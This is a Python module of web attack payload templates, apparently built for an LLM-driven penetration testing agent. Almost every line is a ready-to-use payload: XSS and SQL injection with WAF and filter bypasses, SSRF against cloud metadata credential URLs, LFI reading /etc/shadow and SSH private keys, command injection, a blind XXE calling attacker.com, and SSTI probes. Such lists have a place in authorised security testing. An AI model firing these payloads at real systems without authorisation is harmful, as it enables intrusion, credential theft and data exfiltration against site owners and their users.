"""
Payload Templates - Pre-built payload collections
Easy for LLM to access comprehensive payload lists
"""

from typing import Dict, List


class PayloadTemplates:
    """
    Pre-built payload templates for various vulnerability types
    
    Usage for LLM:
    - templates.xss_all() - Get all XSS payloads
    - templates.sqli_all() - Get all SQLi payloads
    - templates.get_by_waf(waf_type) - Get WAF-specific bypasses
    """
    
    # XSS Payloads - Comprehensive list
    XSS_BASIC = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    ]
    
    XSS_ATTRIBUTE_ESCAPE = [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" onfocus="alert(1)" autofocus="',
        '" onclick="alert(1)" x="',
        '" onmouseenter="alert(1)" x="',
        "'-alert(1)-'",
        '"-alert(1)-"',
        "'+alert(1)+'",
        '"+alert(1)+"',
    ]
    
    XSS_JS_CONTEXT = [
        "';alert(1)//",
        '";alert(1)//',
        "\\';alert(1)//",
        '</script><script>alert(1)</script>',
        "'-alert(1)-'",
        '${alert(1)}',
        '{{constructor.constructor("alert(1)")()}}',
    ]
    
    XSS_POLYGLOT = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "'\"-->]]>*/</script></style></title></textarea></noscript></template><img src=x onerror=alert()>",
        "{{constructor.constructor('alert(1)')()}}",
    ]
    
    XSS_FILTER_BYPASS = [
        '<ScRiPt>alert(1)</ScRiPt>',
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<svg/onload=alert(1)>',
        '<img src=x onerror=alert`1`>',
        '<img/src/onerror=alert(1)>',
        '<img src=x:x onerror=alert(1)>',
        '<IMG """><SCRIPT>alert(1)</SCRIPT>">',
        '<svg><script>alert(1)</script>',
        '<svg><animate onbegin=alert(1) attributeName=x>',
        '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
    ]
    
    XSS_WAF_BYPASS = [
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
        '<img src=x onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1)>',
        '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
        '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        '<svg onload=alert&lpar;1&rpar;>',
        '<img src=x onerror="alert(1)"/*/',
        '<svg onload=al\\u0065rt(1)>',
        '<img src=x onerror=[1].find(alert)>',
        '<img src=x onerror=top[/al/.source+/ert/.source](1)>',
    ]
    
    # SQL Injection Payloads
    SQLI_AUTH_BYPASS = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "') OR ('1'='1",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR ''='",
        "' OR 1=1 LIMIT 1--",
        "1' OR '1'='1",
    ]
    
    SQLI_UNION = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL--",
        "' UNION SELECT @@version--",
        "' UNION SELECT user()--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "0 UNION SELECT NULL--",
        "-1 UNION SELECT 1,2,3--",
    ]
    
    SQLI_ERROR_BASED = [
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=ctxsys.drithsx.sn(1,(SELECT @@version))--",
    ]
    
    SQLI_TIME_BASED = [
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND BENCHMARK(10000000,MD5('test'))--",
        "'; SELECT pg_sleep(5)--",
    ]
    
    SQLI_FILTER_BYPASS = [
        "'/**/OR/**/1=1--",
        "' /*!OR*/ 1=1--",
        "'+OR+'1'='1",
        "'%20OR%20'1'='1",
        "' OR 1=1--+-",
        "' oR '1'='1",
        "'||'1'='1",
        "' OR 1<2--",
        "' OR 2>1--",
    ]
    
    # SSRF Payloads
    SSRF_LOCALHOST = [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:443/",
        "http://127.0.0.1:8080/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://0/",
        "http://127.1/",
        "http://2130706433/",  # Decimal
    ]
    
    SSRF_CLOUD_META = {
        "aws": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
        ],
        "gcp": [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/computeMetadata/v1/",
        ],
        "azure": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        ],
        "digitalocean": [
            "http://169.254.169.254/metadata/v1/",
        ]
    }
    
    SSRF_BYPASS = [
        "http://127.0.0.1.nip.io/",
        "http://localtest.me/",
        "http://127。0。0。1/",  # Fullwidth dots
        "http://0177.0.0.1/",  # Octal
        "http://0x7f.0.0.1/",  # Hex
        "http://127.0.0.1%00@evil.com/",
        "http://evil.com%40127.0.0.1/",
        "http://127.0.0.1%23@evil.com/",
    ]
    
    # LFI Payloads
    LFI_LINUX = [
        "../../../etc/passwd",
        "../../../etc/shadow",
        "../../../etc/hosts",
        "../../../proc/self/environ",
        "../../../proc/version",
        "../../../var/log/apache2/access.log",
        "../../../var/log/nginx/access.log",
        "../../../home/$USER/.ssh/id_rsa",
    ]
    
    LFI_WINDOWS = [
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\windows\\system.ini",
        "..\\..\\..\\inetpub\\logs\\LogFiles\\W3SVC1\\",
    ]
    
    LFI_WRAPPERS = [
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=string.rot13/resource=/etc/passwd",
        "php://input",
        "data://text/plain,<?php phpinfo(); ?>",
        "expect://id",
        "file:///etc/passwd",
    ]
    
    LFI_BYPASS = [
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "%2e%2e%2f%2e%2e%2fetc/passwd",
        "..%252f..%252fetc/passwd",
        "..%c0%af..%c0%afetc/passwd",
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
    ]
    
    # Command Injection
    CMD_INJECTION = [
        "; id",
        "| id",
        "|| id",
        "&& id",
        "& id",
        "\n id",
        "`id`",
        "$(id)",
        "; whoami",
        "| cat /etc/passwd",
    ]
    
    CMD_INJECTION_BLIND = [
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        "|| sleep 5",
        "; ping -c 5 127.0.0.1",
        "| ping -c 5 127.0.0.1",
    ]
    
    # XXE Payloads
    XXE_BASIC = '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>'''
    
    XXE_BLIND = '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo>&send;</foo>'''
    
    # SSTI Payloads
    SSTI = {
        "jinja2": [
            "{{7*7}}",
            "{{config}}",
            "{{config.items()}}",
            "{{self.__class__.__mro__[2].__subclasses__()}}",
        ],
        "twig": [
            "{{7*7}}",
            "{{dump(app)}}",
            "{{app.request.server.all|join(',')}}",
        ],
        "freemarker": [
            "${7*7}",
            "${.globals}",
        ],
        "velocity": [
            "#set($x=7*7)$x",
            "$class",
        ]
    }
    
    @classmethod
    def xss_all(cls) -> List[str]:
        """Get all XSS payloads"""
        return (
            cls.XSS_BASIC +
            cls.XSS_ATTRIBUTE_ESCAPE +
            cls.XSS_JS_CONTEXT +
            cls.XSS_POLYGLOT +
            cls.XSS_FILTER_BYPASS +
            cls.XSS_WAF_BYPASS
        )
    
    @classmethod
    def sqli_all(cls) -> List[str]:
        """Get all SQLi payloads"""
        return (
            cls.SQLI_AUTH_BYPASS +
            cls.SQLI_UNION +
            cls.SQLI_ERROR_BASED +
            cls.SQLI_TIME_BASED +
            cls.SQLI_FILTER_BYPASS
        )
    
    @classmethod
    def ssrf_all(cls) -> List[str]:
        """Get all SSRF payloads"""
        payloads = cls.SSRF_LOCALHOST + cls.SSRF_BYPASS
        for cloud_payloads in cls.SSRF_CLOUD_META.values():
            payloads.extend(cloud_payloads)
        return payloads
    
    @classmethod
    def lfi_all(cls) -> List[str]:
        """Get all LFI payloads"""
        return (
            cls.LFI_LINUX +
            cls.LFI_WINDOWS +
            cls.LFI_WRAPPERS +
            cls.LFI_BYPASS
        )
    
    @classmethod
    def get_by_category(cls, category: str) -> List[str]:
        """Get payloads by category"""
        categories = {
            "xss": cls.xss_all,
            "sqli": cls.sqli_all,
            "ssrf": cls.ssrf_all,
            "lfi": cls.lfi_all,
            "cmd": lambda: cls.CMD_INJECTION + cls.CMD_INJECTION_BLIND,
        }
        
        func = categories.get(category.lower())
        if func:
            return func()
        return []
    
    @classmethod
    def get_for_waf_bypass(cls, waf: str = "generic") -> Dict[str, List[str]]:
        """Get WAF-specific bypass payloads"""
        # Generic WAF bypasses
        return {
            "xss": cls.XSS_WAF_BYPASS,
            "sqli": cls.SQLI_FILTER_BYPASS,
            "ssrf": cls.SSRF_BYPASS,
            "lfi": cls.LFI_BYPASS,
        }
    
    @classmethod
    def get_quick_test(cls) -> Dict[str, str]:
        """Get quick test payloads (one per category)"""
        return {
            "xss": '<script>alert(1)</script>',
            "sqli": "' OR '1'='1",
            "ssrf": "http://127.0.0.1/",
            "lfi": "../../../etc/passwd",
            "cmd": "; id",
            "ssti": "{{7*7}}",
        }
